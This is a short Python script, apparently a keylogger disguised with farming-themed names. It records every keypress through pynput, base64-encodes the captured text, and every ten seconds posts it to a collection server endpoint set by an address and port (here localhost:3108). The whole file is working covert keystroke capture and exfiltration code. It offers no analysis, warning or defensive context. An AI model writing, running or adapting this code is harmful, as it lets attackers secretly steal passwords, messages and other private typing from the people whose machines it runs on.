from pynput import keyboard
import requests
import json
import threading
import base64 


seeds = ""
address = "127.0.0.1"
port = "3108"

delay = 10


def plant_seed():
        global seeds
        try:
            
            if (seeds == ""):
                pass
            else:
                
                seed = json.dumps({"keyboardData": base64.b64encode(seeds.encode()).decode()})
                farmer = requests.post(f"http://{address}:{port}/dados", data=seed, headers={"Content-Type": "application/json"})

                if farmer.status_code == 200:
                    seeds = ""
                else:
                    pass

                
            on_therun = threading.Timer(delay, plant_seed)
            on_therun.start()

        except Exception as e:
            print("Out of Season:", e)


def scyth(key):
    global seeds

    if key == keyboard.Key.enter:
        seeds += "\n"
    elif key == keyboard.Key.space:
        seeds += " "
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.backspace and len(seeds) == 0:
        pass
    elif key == keyboard.Key.backspace and len(seeds) > 0:
        seeds = seeds[:-1]
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pass
    elif key == keyboard.Key.esc:
        pass
    else:
        seeds += str(key).replace("'", "")


with keyboard.Listener(on_press=scyth) as listener:
    plant_seed()
    listener.join()
